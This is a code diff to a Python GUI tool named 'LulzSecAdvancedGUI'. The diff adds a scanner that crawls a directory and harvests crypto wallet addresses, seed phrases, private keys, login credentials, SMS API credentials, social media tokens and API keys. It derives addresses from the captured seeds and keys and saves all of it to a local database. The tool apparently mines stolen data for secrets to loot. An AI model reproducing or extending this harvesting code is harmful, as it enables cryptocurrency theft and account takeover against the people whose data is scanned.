@@ -22,6 +22,7 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from config.api_config import APIConfig
 from core.crypto_utils import EnhancedCryptoUtils
 from core.balance_checker import AdvancedBalanceChecker
+from core.ultra_scanner import UltraAdvancedScanner
 from database.db_manager import EnhancedDatabaseManager
 from validators.email_validator import EmailValidator
 from validators.sms_detector import SMSAPIDetector
@@ -149,6 +150,9 @@ class LulzSecAdvancedGUI:
             self.balance_checker, 
             lambda msg, typ: self.add_log(msg, typ) if hasattr(self, 'add_log') else None
         )
+        
+        # ULTRA-ADVANCED SCANNER
+        self.ultra_scanner = UltraAdvancedScanner(self.crypto_utils, self.db)
         
         # Scanning state
         self.is_scanning = False
@@ -920,6 +924,290 @@ class LulzSecAdvancedGUI:
         self.scan_thread.start()
     
     def _run_crypto_scan(self, target_dir):
+        """Run ULTRA-ADVANCED cryptocurrency scan with ALL payloads"""
+        try:
+            # Update phase
+            self.metrics['scan_phase'] = 'Initializing Ultra Scan...'
+            self.add_log("🔥 ULTRA-ADVANCED SCANNER INITIALIZED", "success")
+            self.add_log("📊 Loading 50+ seed patterns, 30+ key formats, 100+ API patterns...", "info")
+            
+            # Count files first
+            total_files = 0
+            file_list = []
+            for root, dirs, files in os.walk(target_dir):
+                for file in files:
+                    # Skip very large files
+                    file_path = os.path.join(root, file)
+                    try:
+                        if os.path.getsize(file_path) < 50 * 1024 * 1024:  # Max 50MB
+                            file_list.append(file_path)
+                            total_files += 1
+                    except:
+                        continue
+            
+            if total_files == 0:
+                self.add_log("⚠️ No files found in directory", "warning")
+                return
+            
+            self.add_log(f"📊 Found {total_files} files to scan", "success")
+            self.add_log("🔍 ULTRA-AGGRESSIVE EXTRACTION MODE ACTIVE", "success")
+            
+            # Statistics
+            files_scanned = 0
+            start_time = time.time()
+            
+            total_wallets = 0
+            total_seeds = 0
+            total_keys = 0
+            total_creds = 0
+            total_urls = 0
+            total_sms = 0
+            total_tokens = 0
+            total_apis = 0
+            
+            # Scan each file with ULTRA scanner
+            for file_path in file_list:
+                if not self.is_scanning:
+                    self.add_log("⏹️ Scan stopped by user", "warning")
+                    break
+                
+                files_scanned += 1
+                file_name = os.path.basename(file_path)
+                
+                # Update metrics
+                self.metrics['files_scanned'] = files_scanned
+                self.metrics['scan_phase'] = f'Ultra Scanning... {files_scanned}/{total_files}'
+                
+                # Calculate progress
+                progress = (files_scanned / total_files) * 100
+                self.progress_var.set(progress)
+                self.progress_percent_var.set(f"{progress:.1f}%")
+                
+                # Calculate speed
+                elapsed = time.time() - start_time
+                if elapsed > 0:
+                    speed = files_scanned / elapsed
+                    self.metrics['files_per_second'] = speed
+                    
+                    # Estimate remaining time
+                    remaining_files = total_files - files_scanned
+                    if speed > 0:
+                        remaining_time = remaining_files / speed
+                        self.metrics['estimated_time_remaining'] = remaining_time
+                
+                # ULTRA SCAN - Extract EVERYTHING
+                try:
+                    results = self.ultra_scanner.scan_file(file_path)
+                    
+                    # Process wallets
+                    if results['wallets']:
+                        count = len(results['wallets'])
+                        total_wallets += count
+                        self.add_log(f"💰 {file_name}: Found {count} wallet address(es)", "success")
+                        
+                        for wallet in results['wallets'][:10]:  # Limit display
+                            network = wallet['network']
+                            address = wallet['address']
+                            self.wallets_text.insert(tk.END, f"{network}: {address}\n")
+                            self.wallets_text.see(tk.END)
+                            
+                            # Save to database
+                            self.db.add_wallet({
+                                'address': address,
+                                'network': network,
+                                'source_file': file_path
+                            })
+                    
+                    # Process seed phrases
+                    if results['seeds']:
+                        count = len(results['seeds'])
+                        total_seeds += count
+                        self.add_log(f"🌱 {file_name}: Found {count} VALID seed phrase(s)", "success")
+                        
+                        for seed in results['seeds']:
+                            word_count = len(seed.split())
+                            self.seeds_text.insert(tk.END, f"✅ [{word_count} words]: {seed}\n")
+                            self.seeds_text.insert(tk.END, "-" * 80 + "\n")
+                            self.seeds_text.see(tk.END)
+                            
+                            # Save to database
+                            self.db.add_seed_phrase({
+                                'seed_phrase': seed,
+                                'word_count': word_count,
+                                'is_valid': True,
+                                'source_file': file_path
+                            })
+                            
+                            # Derive addresses if enabled
+                            if self.opt_vars.get('derive_networks', tk.BooleanVar(value=True)).get():
+                                try:
+                                    all_addresses = self.crypto_utils.derive_all_addresses_from_seed(seed)
+                                    for network, addr_info in all_addresses.items():
+                                        if 'address' in addr_info:
+                                            self.db.add_derived_address({
+                                                'seed_phrase': seed,
+                                                'network': network,
+                                                'address': addr_info['address']
+                                            })
+                                            # Show in details
+                                            self.details_text.insert(tk.END, f"{network}: {addr_info['address']}\n")
+                                except Exception as e:
+                                    pass
+                    
+                    # Process private keys
+                    if results['private_keys']:
+                        count = len(results['private_keys'])
+                        total_keys += count
+                        self.add_log(f"🔑 {file_name}: Found {count} private key(s)", "success")
+                        
+                        for key_data in results['private_keys'][:10]:
+                            key_type = key_data['type']
+                            key = key_data['key']
+                            self.seeds_text.insert(tk.END, f"🔑 {key_type}: {key[:64]}...\n")
+                            self.seeds_text.see(tk.END)
+                            
+                            # Try to derive address
+                            try:
+                                if key_type in ['RAW_HEX_64', 'RAW_HEX_66', 'ETH_PRIVATE_KEY']:
+                                    for network in ['ETH', 'BTC', 'TRX']:
+                                        try:
+                                            addr = self.crypto_utils.private_key_to_address(key, network)
+                                            if addr:
+                                                self.db.add_wallet({
+                                                    'address': addr,
+                                                    'network': network,
+                                                    'private_key': key,
+                                                    'source_file': file_path
+                                                })
+                                        except:
+                                            pass
+                            except:
+                                pass
+                    
+                    # Process credentials
+                    if results['credentials']:
+                        count = len(results['credentials'])
+                        total_creds += count
+                        self.add_log(f"🔐 {file_name}: Found {count} credential(s)", "success")
+                        
+                        for cred in results['credentials'][:20]:
+                            username = cred['username']
+                            password = cred['password']
+                            self.creds_text.insert(tk.END, f"{username}:{password}\n")
+                            self.creds_text.see(tk.END)
+                            
+                            self.db.add_credential({
+                                'email': username,
+                                'password': password,
+                                'source_file': file_path
+                            })
+                    
+                    # Process URLs
+                    if results['urls']:
+                        count = len(results['urls'])
+                        total_urls += count
+                        if count > 0:
+                            self.add_log(f"🔗 {file_name}: Found {count} URL(s)", "info")
+                            # Show first few
+                            for url in results['urls'][:5]:
+                                self.details_text.insert(tk.END, f"🔗 {url}\n")
+                    
+                    # Process SMS APIs
+                    if results['sms_apis']:
+                        count = len(results['sms_apis'])
+                        total_sms += count
+                        self.add_log(f"📱 {file_name}: Found {count} SMS API credential(s)", "success")
+                        
+                        for api in results['sms_apis']:
+                            provider = api['provider']
+                            self.sms_text.insert(tk.END, f"📱 {provider}:\n")
+                            for key, value in api.items():
+                                if key != 'provider' and value:
+                                    self.sms_text.insert(tk.END, f"  {key}: {value}\n")
+                            self.sms_text.insert(tk.END, "-" * 60 + "\n")
+                            self.sms_text.see(tk.END)
+                            
+                            self.db.add_sms_api({
+                                'provider': provider,
+                                'api_key': str(api),
+                                'source_file': file_path
+                            })
+                    
+                    # Process social tokens
+                    if results['social_tokens']:
+                        count = len(results['social_tokens'])
+                        total_tokens += count
+                        self.add_log(f"💬 {file_name}: Found {count} social media token(s)", "success")
+                        
+                        for token_data in results['social_tokens']:
+                            platform = token_data['platform']
+                            token = token_data['token']
+                            self.details_text.insert(tk.END, f"💬 {platform}: {token}\n")
+                    
+                    # Process API keys
+                    if results['api_keys']:
+                        count = len(results['api_keys'])
+                        total_apis += count
+                        self.add_log(f"🔑 {file_name}: Found {count} API key(s)", "success")
+                        
+                        for api_data in results['api_keys']:
+                            service = api_data['service']
+                            api_key = api_data['api_key']
+                            self.details_text.insert(tk.END, f"🔑 {service}: {api_key}\n")
+                
+                except Exception as e:
+                    if files_scanned % 100 == 0:
+                        self.add_log(f"⚠️ Error scanning {file_name}: {str(e)[:50]}", "warning")
+                
+                # Update display periodically
+                if files_scanned % 10 == 0:
+                    self.root.update_idletasks()
+            
+            # Final update
+            self.progress_var.set(100)
+            self.progress_percent_var.set("100%")
+            
+            # Comprehensive summary
+            summary = f"""
+╔══════════════════════════════════════════════════════════════╗
+║           🔥 ULTRA SCAN COMPLETE - MAXIMUM EXTRACTION 🔥     ║
+╚══════════════════════════════════════════════════════════════╝
+
+📊 SCAN STATISTICS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📁 Files Scanned:        {files_scanned:,}
+💰 Wallet Addresses:     {total_wallets:,}
+🌱 Seed Phrases (VALID): {total_seeds:,}
+🔑 Private Keys:         {total_keys:,}
+🔐 Credentials:          {total_creds:,}
+🔗 URLs Extracted:       {total_urls:,}
+📱 SMS APIs:             {total_sms:,}
+💬 Social Tokens:        {total_tokens:,}
+🔑 API Keys:             {total_apis:,}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⏱️ Scan Time: {elapsed:.2f} seconds
+⚡ Speed: {speed:.2f} files/second
+
+✅ All data saved to database: lulzsec_wallets_ultimate_v9.db
+💾 Use Export menu to save in your preferred format
+            """
+            self.add_log(summary, "success")
+            
+            # Update final statistics
+            self.update_metrics_from_db()
+            
+        except Exception as e:
+            self.add_log(f"❌ Scan error: {e}", "error")
+            import traceback
+            self.add_log(traceback.format_exc(), "error")
+        finally:
+            self.is_scanning = False
+            self.metrics['scan_phase'] = 'Idle'
+            self.scan_status_label.config(text="[◼ STANDBY]", fg=self.theme.colors['neon_yellow'])
+            self.scan_crypto_btn.config(state='normal')
+            self.scan_all_btn.config(state='normal')
+            self.stop_btn.config(state='disabled')
         """Run cryptocurrency scan"""
         try:
             # Update phase
